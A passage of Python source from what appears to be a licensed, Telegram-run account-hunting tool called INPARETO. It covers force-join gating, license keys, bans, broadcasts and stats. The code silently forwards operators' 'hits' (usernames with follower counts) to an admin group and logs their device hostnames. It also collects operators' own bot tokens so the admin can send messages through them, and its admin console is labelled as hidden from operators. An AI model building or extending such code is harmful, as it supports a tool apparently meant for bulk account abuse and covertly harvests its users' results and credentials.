            response = requests.get(
                f"{api}/getChat",
                params={"chat_id": chat_ref},
                timeout=ADMIN_MEMBER_TIMEOUT,
            )
            if response.ok:
                chat_id = (response.json().get("result") or {}).get("id")
                if chat_id is not None:
                    return str(chat_id)
        except Exception:
            continue
    return None


def admin_get_chat_member_status(chat_ref, user_id):
    """Check membership using admin bot, then operator bot (either may be in the chat)."""
    user_id = str(user_id).strip()
    chat_ref = (chat_ref or "").strip()
    if not chat_ref or not user_id:
        return None

    refs = [chat_ref]
    if chat_ref.startswith("@"):
        resolved = admin_resolve_chat_id_via_getchat(chat_ref)
        if resolved and resolved not in refs:
            refs.append(resolved)

    for api in _telegram_lookup_api_urls():
        for ref in refs:
            try:
                response = requests.get(
                    f"{api}/getChatMember",
                    params={"chat_id": ref, "user_id": user_id},
                    timeout=ADMIN_MEMBER_TIMEOUT,
                )
                if response.ok:
                    status = (response.json().get("result") or {}).get("status")
                    if status:
                        return status
            except Exception:
                continue
    return None


def admin_check_force_join(user_id):
    targets, err = admin_fetch_force_join_targets()
    if err:
        return False, [], f"Force-join check failed: {err}"
    if not targets:
        return True, [], None
    if not _admin_settings.get("admin_bot_token") and not TELEGRAM_BOT_TOKEN:
        return False, targets, "No bot token for join verification (set admin bot in /set adminbot)"
    missing = []

    def _check_row(row):
        ref = admin_resolve_force_join_chat_ref(row)
        status = admin_get_chat_member_status(ref, user_id)
        if status in ADMIN_MEMBER_OK:
            return None
        bad = dict(row)
        if status == "left":
            bad["_verify_hint"] = "not joined yet"
        elif status == "kicked":
            bad["_verify_hint"] = "you were removed — re-join"
        elif not status:
            bad["_verify_hint"] = (
                "cannot verify (add admin or operator bot to this chat, "
                "or fix /force link to @username or t.me/…)"
            )
        else:
            bad["_verify_hint"] = f"status: {status}"
        return bad

    workers = min(8, max(1, len(targets)))
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_check_row, row) for row in targets]
        for fut in as_completed(futures):
            try:
                bad = fut.result()
                if bad:
                    missing.append(bad)
            except Exception:
                pass
    return len(missing) == 0, missing, None


def admin_invalidate_access(user_id=None):
    _admin_access_cache["ok"] = False
    _admin_access_cache["at"] = 0.0
    invalidate_ban_cache(user_id)
    license_invalidate_cache()
    _invalidate_dashboard_plan_cache()
    invalidate_operator_gate_cache()
    if user_id is not None:
        _admin_access_cache["user_id"] = str(user_id)


def admin_user_access_granted(user_id):
    user_id = str(user_id)
    if admin_is_admin(user_id):
        return True, None
    now = time.time()
    entitled, plan_reason, _ = operator_plan_entitled(user_id)
    if not entitled:
        if (
            plan_reason == "cloud_offline"
            and read_operator_session_verified(user_id)
            and (_dashboard_local_premium_snap(user_id) or admin_is_admin(user_id))
        ):
            _admin_access_cache.update({"user_id": user_id, "ok": True, "at": now})
            return True, None
        _admin_access_cache.update({"user_id": user_id, "ok": False, "at": now})
        return False, plan_reason
    if operator_ban_active(user_id, force=False):
        _admin_access_cache.update({"user_id": user_id, "ok": False, "at": now})
        return False, "banned"
    if (
        _admin_access_cache["user_id"] == user_id
        and _admin_access_cache["ok"]
        and now - _admin_access_cache["at"] < ADMIN_ACCESS_TTL
    ):
        return True, None
    ok, missing, ferr = admin_check_force_join(user_id)
    if ferr:
        if (
            _admin_access_cache["user_id"] == user_id
            and _admin_access_cache["ok"]
            and now - _admin_access_cache["at"] < ADMIN_ACCESS_TTL * 6
        ):
            return True, None
        return False, ferr
    if not ok:
        _admin_access_cache.update({"user_id": user_id, "ok": False, "at": now})
        return False, missing
    _admin_access_cache.update({"user_id": user_id, "ok": True, "at": now})
    return True, None


def telegram_validate_inline_url(url):
    """Telegram url buttons require http(s) with a real host (t.me or domain with a dot)."""
    url = (url or "").strip()
    if not url:
        return None
    if url.startswith("@"):
        url = f"https://t.me/{url.lstrip('@')}"
    elif not url.startswith(("http://", "https://")):
        if re.fullmatch(r"-?\d+", url):
            return None
        url = f"https://t.me/{url.lstrip('@/')}"
    if url.startswith("http://"):
        url = "https://" + url[7:]
    try:
        parsed = urlparse(url)
        host = (parsed.netloc or "").lower().split(":")[0]
        if not host:
            return None
        if host in ("t.me", "telegram.me") or host.endswith(".t.me"):
            return url
        if "." in host:
            return url
    except Exception:
        pass
    return None


def force_join_row_button_url(row):
    """Build a Telegram-safe join URL for inline keyboards (never use -100… chat ids as URLs)."""
    raw_inv = (row.get("invite_link") or "").strip()
    raw_cid = (row.get("chat_id") or "").strip()
    combined = raw_inv or raw_cid
    preview = (row.get("preview_name") or "").lower()

    if "channel" in preview and _admin_settings.get("channel_username"):
        uname = _admin_settings["channel_username"].lstrip("@")
        return telegram_validate_inline_url(f"https://t.me/{uname}")

    if combined and "://" in combined and "t.me" not in combined.lower():
        host = combined.split("://", 1)[-1].split("/")[0].strip()
        if host and not re.fullmatch(r"-?\d+", host):
            combined = f"https://t.me/{host.lstrip('@')}"

    _, parsed_inv = admin_parse_chat_target(combined)
    for candidate in (parsed_inv, raw_inv, combined):
        if not candidate or re.fullmatch(r"-?\d+", str(candidate).strip()):
            continue
        valid = telegram_validate_inline_url(candidate)
        if valid:
            return valid
    if combined.startswith("@"):
        return telegram_validate_inline_url(combined)
    return None


def sanitize_inline_keyboard_urls(keyboard):
    """Drop invalid url buttons so sendMessage does not fail with HTTP 400."""
    if not keyboard or "inline_keyboard" not in keyboard:
        return keyboard
    rows = []
    for row in keyboard.get("inline_keyboard") or []:
        clean = []
        for btn in row:
            url = btn.get("url")
            if url:
                valid = telegram_validate_inline_url(url)
                if not valid:
                    continue
                btn = dict(btn)
                btn["url"] = valid
            clean.append(btn)
        if clean:
            rows.append(clean)
    return {"inline_keyboard": rows} if rows else None


def admin_join_gate_keyboard(missing):
    rows = []
    for row in missing[:6]:
        link = force_join_row_button_url(row)
        label = row.get("preview_name", "Join")[:30]
        if link:
            rows.append([{"text": f"Join · {label}", "url": link}])
    rows.append([{"text": "✓ I joined — verify access", "callback_data": "VERIFY_JOIN"}])
    return {"inline_keyboard": rows}


def admin_format_gate_message(missing=None, reason=""):
    lines = [
        format_panel_header(),
        f"<b>{S['brand']} Access Required</b>\n\n",
        "<i>Complete Telegram steps before remote control or hunting starts.</i>\n\n",
    ]
    if reason == "banned":
        lines.append("<b>You are suspended from INPARETO.</b>\nContact admin.\n")
        return "".join(lines)
    if reason and reason != "banned":
        lines.append(f"<i>{html.escape(reason)}</i>\n\n")
    targets, _ = admin_fetch_force_join_targets()
    if not targets:
        lines.append("<i>No force-join channels configured yet. Ask admin.</i>\n")
        return "".join(lines)
    lines.append("<b>Join all required channels/groups:</b>\n")
    show = missing if missing else targets
    for row in show:
        name = html.escape(row.get("preview_name", "Channel"))
        link = html.escape(row.get("invite_link") or row.get("chat_id", ""))
        hint = row.get("_verify_hint", "")
        lines.append(f"  {S['bullet']} <b>{name}</b>\n      <code>{link}</code>\n")
        if hint and missing:
            lines.append(f"      <i>{html.escape(hint)}</i>\n")
    lines.append(
        "\n<i>Join each link, then tap <b>Verify access</b> or send <code>/verify</code>.</i>\n"
        "<i>Admin: add <b>admin bot</b> (or your operator bot) inside private groups "
        "so membership can be checked.</i>\n"
    )
    lines.append(f"<i>Channel: {admin_channel_tag()}</i>")
    return "".join(lines)


_gate_terminal_notify_at = 0.0


def build_terminal_access_notice_rows():
    """Single source for terminal + dashboard access hints (paint_action_box rows)."""
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return [_terminal_verify_line("Telegram", "Link bot in joint.py setup", ANSI_YELLOW)]
    entitled, plan_reason, info = operator_plan_entitled(user_id)
    if not entitled:
        if plan_reason == "trial_expired":
            return [
                _terminal_verify_line("Plan", f"Free trial ended ({FREE_TRIAL_DAYS} days)", ANSI_RED),
                _terminal_verify_line("Fix", "/redeem INPA-… for Premium", ANSI_DIM),
            ]
        if plan_reason == "expired":
            exp = info.get("expires_at") if isinstance(info, dict) else None
            return [
                _terminal_verify_line(
                    "Premium", f"Expired · {license_format_expiry(exp)}", ANSI_RED,
                ),
                _terminal_verify_line("Fix", "/redeem NEW-KEY in bot", ANSI_DIM),
            ]
        if plan_reason == "cloud_offline":
            return [
                _terminal_verify_line("Plan", "Cloud offline — cannot verify", ANSI_RED),
                _terminal_verify_line("Fix", "Check internet, retry /plan", ANSI_DIM),
            ]
        return [
            _terminal_verify_line("Plan", "No active trial or license", ANSI_RED),
            _terminal_verify_line("Fix", "/plan in bot · /redeem for Premium", ANSI_DIM),
        ]
    if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
        used = int(info.get("day_count") or 0)
        limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
        days_left = int(info.get("days_left") or 0)
        if used >= limit:
            return [
                _terminal_verify_line(
                    "Plan", f"Free daily limit {used:,}/{limit:,}", ANSI_RED,
                ),
                _terminal_verify_line("Fix", "Switch to INPARETO Premium — /redeem", ANSI_DIM),
            ]
        rows = [
            _terminal_verify_line(
                "Plan", f"Free · {days_left}d trial · {used:,}/{limit:,} today", ANSI_YELLOW,
            ),
        ]
    else:
        rows = []
    granted, state = admin_user_access_granted(user_id)
    if not granted:
        if state == "banned":
            return [_terminal_verify_line("Access", "Suspended — contact admin", ANSI_RED)]
        if isinstance(state, list):
            rows = [
                _terminal_verify_line("Channels", "Join all required links in bot", ANSI_YELLOW),
            ]
            for row in state[:3]:
                hint = row.get("_verify_hint", "pending")
                name = row.get("preview_name", "Channel")
                rows.append(_terminal_verify_line(name, hint, ANSI_DIM))
            rows.append(_terminal_verify_line("Fix", "/verify in bot after joining", ANSI_DIM))
            return rows
        return [_terminal_verify_line("Access", str(state)[:50], ANSI_YELLOW)]
    hg_ok, hg_reason = operator_hit_group_access_state(force=True)
    gid = get_operator_hit_group_id()
    if hg_ok:
        return []
    if hg_reason == "not_admin":
        return [
            _terminal_verify_line("Hit group", "Bot needs admin rights", ANSI_YELLOW),
            _terminal_verify_line("Fix", "/verifyhitgroup in your hit group", ANSI_DIM),
        ]
    return [
        _terminal_verify_line("Hit group", "Not linked yet", ANSI_YELLOW),
        _terminal_verify_line("Fix", "Add bot to group → /verifyhitgroup", ANSI_DIM),
    ]


def _terminal_notice_title(rows):
    text = " ".join(r[0] for r in rows).lower()
    if "plan" in text or "license" in text:
        if "expired" in text or "ended" in text or "limit" in text:
            return "PLAN UPGRADE REQUIRED"
        return "PLAN REQUIRED" if "premium" not in text else "PREMIUM REQUIRED"
    if "channels" in text:
        return "JOINS REQUIRED"
    if "hit group" in text:
        return "HIT GROUP REQUIRED"
    if "banned" in text:
        return "ACCESS SUSPENDED"
    return "SETUP REQUIRED"


def print_terminal_access_notice(*, force=False):
    """Print one formatted box; skip duplicates and verification-wait spam."""
    global _terminal_notice_signature, _terminal_notice_last_print_at
    if _boot_configuring and not force:
        return
    if _session_awaiting_verification and not force:
        return
    if JACK_PANEL_LIVE and not force:
        return
    try:
        rows = build_terminal_access_notice_rows()
        if not rows:
            _terminal_notice_signature = ""
            return
        sig = "|".join(f"{text}:{color}" for text, color in rows)
        now = time.time()
        if (
            not force
            and sig == _terminal_notice_signature
            and (now - _terminal_notice_last_print_at) < TERMINAL_NOTICE_REPEAT_SEC
        ):
            return
        _terminal_notice_signature = sig
        _terminal_notice_last_print_at = now
        print()
        for line in paint_action_box(_terminal_notice_title(rows), rows, ANSI_YELLOW):
            print(line)
        print()
    except Exception as exc:
        log_event("TERM NOTICE", str(exc)[:100])


def admin_apply_terminal_gate(*, notify_bot=False, source=""):
    """Sync pause state; optional Telegram gate (terminal uses print_terminal_access_notice)."""
    global _gate_terminal_notify_at
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return
    reconcile_operator_hit_group()
    sync_operator_access()
    if operator_ban_active(user_id, force=False):
        print_terminal_access_notice(force=True)
        pause_event.clear()
        return
    if operator_access_ok(force=True) or _operator_hunt_trusted():
        if not paused:
            pause_event.set()
        return
    if _operator_hunt_trusted() or _access_trust_grace_active():
        if not paused:
            pause_event.set()
        return
    print_terminal_access_notice()
    pause_event.clear()
    now = time.time()
    if notify_bot and TELEGRAM_ENABLED and not _session_awaiting_verification:
        if now - _gate_terminal_notify_at >= HIT_GROUP_GATE_SEND_COOLDOWN:
            _gate_terminal_notify_at = now
            text, kb = admin_gate_reply_for_user(user_id)
            if text:
                if _is_hit_group_gate_text(text):
                    send_hit_group_gate_reply(text, reply_markup=kb)
                else:
                    bot_command_reply(text, reply_markup=kb)


def admin_sync_terminal_access():
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return False
    if operator_ban_active(user_id, force=False):
        return False
    if read_operator_session_verified(user_id):
        if admin_is_admin(user_id) or _dashboard_local_premium_snap(user_id):
            if (
                read_local_hit_group_id()
                or get_operator_hit_group_id()
                or hit_group_recently_delivered()
            ):
                return True
    granted, state = admin_user_access_granted(user_id)
    if not granted:
        if state == "banned":
            return False
        if read_operator_session_verified(user_id) and _operator_hunt_trusted():
            return True
        return False
    hg_ok, _hg = operator_hit_group_access_state(force=False)
    if hg_ok:
        return True
    if read_local_hit_group_id() or hit_group_recently_delivered():
        return True
    return False


def admin_notify_logs_new_device(device_hash, record, operator_id):
    chat = _admin_settings.get("logs_group_id")
    if not chat:
        return
    info = fetch_telegram_user(operator_id) if operator_id else None
    name = (info or {}).get("display_name") or operator_id or "unknown"
    op_link = telegram_profile_link_html(operator_id) if operator_id else html.escape(name)
    lines = [
        format_panel_header(),
        "<b>◈ NEW USER · LOG</b>\n\n",
        tg_row("Operator", op_link),
        tg_row("Device", f"{device_hash[:16]}…"),
        tg_row("Host", (record or {}).get("hostname") or platform.node()),
        tg_row("API", (record or {}).get("api_host") or "pending"),
        tg_row("Telegram ID", str(operator_id or "—")),
        tg_row("Channel", admin_channel_tag()),
    ]
    if record:
        lines.append(tg_row("First seen", str(record.get("first_seen", ""))[:19]))
    admin_send_message(chat, "".join(lines))


def admin_forward_hit_to_group(caption, photo_bytes=None, content_type="image/jpeg", operator_id=None):
    chat = _admin_settings.get("hits_group_id")
    if not chat:
        log_event("ADMIN HIT", "mirror skipped — hits_group_id not set")
        return False
    op_id = operator_id or resolve_operator_id(TELEGRAM_CHAT_ID)
    op_link = telegram_profile_link_html(op_id)
    extra = f"\n\n<b>Operator</b> {op_link}\n<b>Channel</b> {admin_channel_tag()}"
    full_caption = caption + extra
    if photo_bytes:
        resp = admin_send_photo(chat, full_caption, photo_bytes, content_type)
    else:
        resp = admin_send_message(chat, full_caption)
    if resp is None:
        log_event("ADMIN HIT", "mirror send failed")
        return False
    return True


def admin_fetch_all_devices(limit=500):
    reg, err = operator_links_fetch_registry(force=True)
    if err:
        return [], err
    users = (reg or {}).get("users") or {}
    rows = []
    for uid, info in list(users.items())[: int(limit)]:
        if not isinstance(info, dict):
            continue
        token = (info.get("bot_token") or "").strip()
        if not token:
            continue
        rows.append(
            {
                "telegram_chat_id": str(uid),
                "telegram_bot_token": token,
                "display_name": (info.get("display_name") or "")[:64],
                "last_seen": info.get("updated_at") or "",
            }
        )
    return rows, None


def admin_operator_bot_send(token, chat_id, text):
    if not token or not chat_id:
        return False, "missing token/chat"
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": str(chat_id),
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=12,
        )
        if r.ok:
            return True, None
        return False, r.text[:80]
    except Exception as exc:
        return False, str(exc)


def admin_broadcast_message(text):
    devices, err = admin_fetch_all_devices()
    if err:
        return f"Device fetch failed: {err}"
    sent = 0
    failed = 0
    for row in devices:
        token = (row.get("telegram_bot_token") or "").strip()
        chat = (row.get("telegram_chat_id") or "").strip()
        if not token or not chat:
            failed += 1
            continue
        ok, _ = admin_operator_bot_send(token, chat, text)
        if ok:
            sent += 1
        else:
            failed += 1
    return f"Broadcast done · sent {sent} · failed {failed}"


# Admin config keys: KEY → (settings_field, hint, max_len)
ADMIN_SET_REGISTRY = {
    "adminbot": ("admin_bot_token", "Force-join check bot token", 120),
    "logs": ("logs_group_id", "New-user alerts group ID", 32),
    "hits": ("hits_group_id", "Hits mirror group ID", 32),
    "channel": ("channel_username", "Brand channel username", 32),
    "botname": ("operator_bot_name", "Operator bot display name", 64),
    "botdesc": ("operator_bot_description", "Operator bot about text", 512),
    "botshort": ("operator_bot_short_description", "Operator bot short line", 120),
    "botphoto": ("operator_bot_photo_url", "Operator bot PFP (Telegra.ph URL)", 500),
    "opgrouptitle": ("operator_hit_group_title", "Operator hit group title", 128),
    "opgroupdesc": ("operator_hit_group_description", "Operator hit group about", 255),
    "opgroupphoto": ("operator_hit_group_photo_url", "Operator hit group PFP URL", 500),
}

ADMIN_SET_LEGACY = {
    "/setadminbot": "adminbot",
    "/setlogs": "logs",
    "/sethits": "hits",
    "/setchannel": "channel",
    "/setbotname": "botname",
    "/setbotdesc": "botdesc",
    "/setbotshort": "botshort",
    "/setbotphoto": "botphoto",
}


def _admin_mask_secret(value, show=8):
    value = str(value or "")
    if len(value) <= show + 2:
        return value or "—"
    return value[:show] + "…"


def admin_format_set_guide():
    lines = [
        format_panel_header(),
        "<b>◈ ADMIN · CONFIG HUB</b>\n\n",
        "<i>Syntax: <code>/set KEY value</code> — spaces allowed in value.</i>\n",
        "<code>/set list</code>  live values  ·  <code>/set admin ID</code>  add admin\n",
        "<code>/set rebrand</code>  apply branding to all operator bots\n\n",
    ]
    sections = [
        ("CORE", ("adminbot",)),
        ("GROUPS", ("logs", "hits", "channel")),
        ("OPERATOR BOT BRAND", ("botname", "botdesc", "botshort", "botphoto")),
        ("OPERATOR HIT GROUP", ("opgrouptitle", "opgroupdesc", "opgroupphoto")),
    ]
    for title, keys in sections:
        lines.append(f"<b>{title}</b>\n")
        for key in keys:
            field, hint, _max_len = ADMIN_SET_REGISTRY[key]
            lines.append(f"  <code>/set {key}</code>  <i>{html.escape(hint)}</i>\n")
        lines.append("\n")
    lines.append("<b>SHORTCUTS</b> (still work)\n")
    lines.append("  <code>/addadmin ID</code>  <code>/rebrand</code>  <code>/botdefaults</code>\n")
    lines.append("  <code>/setlogs</code> <code>/sethits</code> … → same as <code>/set logs</code>\n\n")
    lines.append(f"<i>Channel: {admin_channel_tag()}</i>")
    return "".join(lines)


def admin_format_set_list():
    lines = [
        format_panel_header(),
        "<b>◈ LIVE CONFIG</b>\n\n",
    ]
    for key, (field, hint, _max_len) in ADMIN_SET_REGISTRY.items():
        raw = _admin_settings.get(field, "")
        if field == "admin_bot_token":
            display = _admin_mask_secret(raw, 10)
        elif field == "channel_username":
            display = f"@{raw}" if raw else "—"
        elif field in ("operator_bot_description",):
            display = (str(raw)[:48] + "…") if raw and len(str(raw)) > 48 else (raw or "—")
        else:
            display = str(raw)[:60] if raw else "—"
        lines.append(f"  <b>{key}</b>  <code>{html.escape(str(display))}</code>\n")
    admins = ", ".join(_admin_settings.get("admin_ids", [])) or "—"
    lines.append(f"\n  <b>admins</b>  <code>{html.escape(admins)}</code>\n")
    return "".join(lines)


def admin_apply_set_key(key, value):
    key = (key or "").lower().strip()
    if key not in ADMIN_SET_REGISTRY:
        return f"Unknown key <code>{html.escape(key)}</code>. Send <code>/set</code> for the full guide."
    field, hint, max_len = ADMIN_SET_REGISTRY[key]
    value = (value or "").strip()
    if not value:
        return f"Usage: <code>/set {key}</code> &lt;value&gt;\n<i>{html.escape(hint)}</i>"
    if key == "channel":
        value = value.lstrip("@")[:max_len]
    else:
        value = value[:max_len]
    _admin_settings[field] = value
    err = admin_save_settings()
    label = key.replace("bot", "bot ")
    return f"<b>{label.strip()}</b> saved. {err or 'OK'}"


def admin_handle_set(command):
    parts = command.strip().split(None, 2)
    if len(parts) < 2:
        return admin_format_set_guide()
    sub = parts[1].lower()
    if sub in {"help", "guide", "list", "?"}:
        return admin_format_set_list() if sub == "list" else admin_format_set_guide()
    if sub == "admin":
        uid = (parts[2] if len(parts) > 2 else "").strip()
        if not uid:
            return "Usage: <code>/set admin TELEGRAM_USER_ID</code>"
        ids = set(_admin_settings.get("admin_ids", []))
        ids.add(uid)
        _admin_settings["admin_ids"] = sorted(ids)
        err = admin_save_settings()
        return f"Admin added: <code>{html.escape(uid)}</code>. {err or ''}"
    if sub in {"rebrand", "apply", "sync"}:
        bot_msg = rebrand_all_operator_bots()
        grp_msg = rebrand_all_operator_hit_groups()
        return f"{bot_msg}\n{grp_msg}"
    if sub == "botdefaults":
        return admin_format_set_list()
    if len(parts) < 3:
        return admin_apply_set_key(sub, "")
    return admin_apply_set_key(sub, parts[2])


def admin_format_help():
    return (
        format_panel_header()
        + "<b>◈ ADMIN CONSOLE</b>\n\n"
        + "<i>Hidden — operators never see this.</i>\n\n"
        + "<b>◉ Config hub</b>\n"
        + "<code>/set</code>  full key guide + examples\n"
        + "<code>/set list</code>  live values from cloud\n\n"
        + "<b>◉ Access</b>\n"
        + "<code>/force NAME LINK</code>  <code>/forcelist</code>  <code>/forcedel NAME</code>\n"
        + "<code>/addadmin ID</code>  <i>(shortcut for /set admin)</i>\n\n"
        + "<b>◉ Users</b>\n"
        + "<code>/ban ID reason</code>  <code>/unban ID</code>  <code>/users</code>\n\n"
        + "<b>◉ Paid access</b>\n"
        + "<code>/licensegen 30</code>  <i>days · generates INPA- key</i>\n"
        + "<code>/grant ID 30</code>  <code>/revoke ID</code>\n"
        + "<code>/licenseinfo ID</code>  <code>/licenses</code>  <code>/licensekeys</code>\n\n"
        + "<b>◉ Ops</b>\n"
        + "<code>/broadcast message</code>  <code>/adminstats</code>\n"
        + "<code>/rebrand</code>  <i>apply bot name/desc/photo to all bots</i>\n\n"
        + f"<i>Logs/hits via admin bot · {admin_channel_tag()}</i>"
    )


def admin_notify_admins_dm(text):
    for admin_id in _admin_settings.get("admin_ids", []):
        if admin_id:
            admin_send_message(admin_id, text)


def admin_notify_hit_summary(username, followers, following, operator_id=None):
    op_id = operator_id or TELEGRAM_CHAT_ID
    op_link = telegram_profile_link_html(op_id)
    text = (
        format_panel_header()
        + "<b>◈ ADMIN · HIT ALERT</b>\n\n"
        + f"<b>@{html.escape(username)}</b>\n"
        + f"Followers <code>{html.escape(str(followers))}</code> · "
        + f"Following <code>{html.escape(str(following))}</code>\n"
        + f"<b>Operator</b> {op_link}\n"
        + f"<b>Channel</b> {admin_channel_tag()}"
    )
    admin_notify_admins_dm(text)


def admin_process_command(command, from_user_id):
    if not admin_is_admin(from_user_id):
        return None
    parts = command.strip().split(maxsplit=2)
    head = parts[0].lower() if parts else ""
    args = parts[1:] if len(parts) > 1 else []

    if head in {"/admin", "/adminhelp"}:
        return admin_format_help()
    if head == "/set":
        return admin_handle_set(command)
    if head in ADMIN_SET_LEGACY:
        key = ADMIN_SET_LEGACY[head]
        if key in ("botname", "botdesc", "botshort"):
            rest = command.split(None, 1)
            return admin_apply_set_key(key, rest[1] if len(rest) > 1 else "")
        return admin_apply_set_key(key, args[0] if args else "")
    if head == "/addadmin" and args:
        return admin_handle_set(f"/set admin {args[0]}")
    if head in {"/botdefaults", "/get"}:
        return admin_format_set_list()
    if head in {"/rebrand", "/rebrandall"}:
        return rebrand_all_operator_bots()
    if head == "/force" and len(args) >= 2:
        name = args[0].strip()
        link = args[1].strip()
        chat_id, invite = admin_parse_chat_target(link)
        if not invite:
            return "Invalid link"
        err = admin_upsert_force_join(name, chat_id or invite, invite)
        admin_invalidate_access()
        return f"Force-join added: {name}. {err or 'OK'}"
    if head == "/forcelist":
        rows, err = admin_fetch_force_join_targets()
        if err:
            return err
        if not rows:
            return "No force-join targets."
        lines = ["<b>Force join list</b>\n"]
        for row in rows:
            lines.append(
                f"  <b>{html.escape(row['preview_name'])}</b>\n"
                f"  <code>{html.escape(row.get('chat_id', ''))}</code>\n"
                f"  {html.escape(row.get('invite_link', ''))}\n"
            )
        return "".join(lines)
    if head == "/forcedel" and args:
        err = admin_delete_force_join(args[0].strip())
        admin_invalidate_access()
        return f"Removed {args[0]}. {err or 'OK'}"
    if head == "/ban" and args:
        uid = args[0].strip()
        reason = args[1].strip() if len(args) > 1 else "Policy"
        err = admin_ban_operator(uid, reason, from_user_id)
        admin_invalidate_access(uid)
        pause_event.clear()
        return f"Banned {uid}. {err or ''}"
    if head == "/unban" and args:
        uid = args[0].strip()
        err = admin_unban_operator(uid)
        admin_invalidate_access(uid)
        return f"Unbanned {uid}. {err or ''}"
    if head in {"/licensegen", "/genkey"}:
        days = license_parse_duration_days(args[0] if args else "30")
        key, err = license_generate_key(days, from_user_id)
        if err:
            return f"Key failed: {err}"
        if not key:
            return "Key generation failed."
        return (
            f"<b>License key · {days} day(s)</b>\n\n"
            f"<code>{html.escape(key)}</code>\n\n"
            f"<i>User redeems with</i> <code>/redeem {html.escape(key)}</code>"
        )
    if head == "/grant" and len(args) >= 2:
        uid = args[0].strip()
        days = license_parse_duration_days(args[1])
        ok, result = license_grant_user(uid, days, by_admin=from_user_id, source="manual")
        if not ok:
            return f"Grant failed: {result}"
        return (
            f"Granted <b>{days}d</b> to <code>{html.escape(uid)}</code>\n"
            f"Expires: {license_format_expiry(result)}"
        )
    if head == "/revoke" and args:
        uid = args[0].strip()
        err = license_revoke_user(uid)
        return f"Revoked license for <code>{html.escape(uid)}</code>. {err or 'OK'}"
    if head == "/licenseinfo" and args:
        uid = args[0].strip()
        snap = plan_build_snapshot(uid)
        if snap.get("tier") == "admin":
            return f"<b>Admin</b> · unlimited\nID <code>{html.escape(uid)}</code>"
        if snap.get("plan") == PLAN_PREMIUM and snap.get("active"):
            return (
                f"<b>INPARETO Premium</b>\n"
                f"ID <code>{html.escape(uid)}</code>\n"
                f"Expires {license_format_expiry(snap.get('expires_at'))}"
            )
        if snap.get("plan") == PLAN_FREE:
            used = int(snap.get("day_count") or 0)
            limit = int(snap.get("limit") or FREE_DAILY_GEN_LIMIT)
            trial = license_format_expiry(snap.get("trial_ends_at"))
            status = "expired" if snap.get("trial_expired") else "active"
            return (
                f"<b>INPARETO Free</b> ({status})\n"
                f"ID <code>{html.escape(uid)}</code>\n"
                f"Trial ends {trial}\n"
                f"Today {used:,}/{limit:,} generated"
            )
        return f"No active plan ({snap.get('reason') or 'unknown'}). ID <code>{html.escape(uid)}</code>"
    if head == "/licenses":
        reg, err = license_fetch_registry(force=True)
        if err:
            return f"Load failed: {err}"
        now = datetime.now(timezone.utc)
        lines = ["<b>Active licenses</b>\n"]
        count = 0
        for uid, row in sorted(reg.get("licenses", {}).items()):
            exp = license_parse_iso(row.get("expires_at"))
            if not exp or exp <= now:
                continue
            count += 1
            lines.append(
                f"  <code>{html.escape(uid)}</code> → {license_format_expiry(exp)}\n"
                f"  <i>{html.escape(row.get('source', ''))}</i>\n"
            )
        if not count:
            lines.append("<i>None active.</i>\n")
        return "".join(lines)
    if head == "/licensekeys":
        reg, err = license_fetch_registry(force=True)
        if err:
            return f"Load failed: {err}"
        lines = ["<b>Unused keys</b>\n"]
        unused = 0
        for key, row in reg.get("keys", {}).items():
            if row.get("redeemed_by"):
                continue
            unused += 1
            lines.append(
                f"  <code>{html.escape(key)}</code> · {row.get('days')}d\n"
            )
        if not unused:
            lines.append("<i>None — use /licensegen 30</i>\n")
        return "".join(lines)
    if head == "/broadcast":
        msg = command.split(None, 1)
        if len(msg) < 2:
            return "Usage: /broadcast your message"
        body = (
            format_panel_header()
            + "<b>◈ INPARETO Broadcast</b>\n\n"
            + html.escape(msg[1])
            + f"\n\n<i>{admin_channel_tag()}</i>"
        )
        return admin_broadcast_message(body)
    if head == "/users":
        devices, err = admin_fetch_all_devices(30)
        if err:
            return err
        lines = ["<b>Recent devices</b>\n"]
        for row in devices[:15]:
            lines.append(
                f"  {html.escape(row.get('display_name', '?'))} · "
                f"<code>{row.get('telegram_chat_id', '?')}</code>\n"
                f"  <code>{row.get('device_hash', '')[:12]}…</code>\n"
            )
        return "".join(lines)
    if head == "/adminstats":
        devices, _ = admin_fetch_all_devices()
        targets, _ = admin_fetch_force_join_targets()
        return (
            f"<b>Admin stats</b>\n"
            f"Devices: {len(devices)}\n"
            f"Force joins: {len(targets)}\n"
            f"Logs: <code>{_admin_settings.get('logs_group_id') or '—'}</code>\n"
            f"Hits: <code>{_admin_settings.get('hits_group_id') or '—'}</code>\n"
        )
    return "Unknown command. <code>/admin</code> overview · <code>/set</code> full config guide"


def admin_gate_reply_for_user(from_user_id):
    entitled, plan_reason, plan_info = operator_plan_entitled(from_user_id)
    if not entitled:
        exp = plan_info.get("expires_at") if isinstance(plan_info, dict) else None
        return format_operator_plan_gate(plan_reason or "no_license", plan_info, exp), None
    granted, state = admin_user_access_granted(from_user_id)
    if not granted:
        if state == "banned":
            return admin_format_gate_message(reason="banned"), None
        if state in ("trial_expired", "expired", "cloud_offline", "no_license"):
            return format_operator_plan_gate(state, plan_info), None
        missing = state if isinstance(state, list) else []
        kb = admin_join_gate_keyboard(missing)
        return admin_format_gate_message(missing=missing), kb
    hg_ok, hg_reason = operator_hit_group_access_state()
    if not hg_ok:
        return format_hit_group_gate_message(hg_reason), hit_group_gate_keyboard()
    return None, None


def get_throughput_metrics():
    elapsed = (datetime.now(timezone.utc) - START_TIME).total_seconds()
    with lock:
        generated = gen
        hits_count = hit
        error_count = errors
        valid_count = valid
    if elapsed < 1:
        elapsed = 1
    gen_per_min = generated / (elapsed / 60)
    hits_per_hr = hits_count / (elapsed / 3600)
    err_pct = (error_count / generated * 100) if generated else 0.0
    avg_sec_per_gen = elapsed / generated if generated else 0.0
    return {
        "gen_per_min": gen_per_min,
        "hits_per_hr": hits_per_hr,
        "err_pct": err_pct,
        "avg_sec_per_gen": avg_sec_per_gen,
        "generated": generated,
        "hits_count": hits_count,
        "valid_count": valid_count,
        "error_count": error_count,
        "elapsed": elapsed,
    }


def format_stats():
    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
    with lock:
        generated = gen
        valid_count = valid
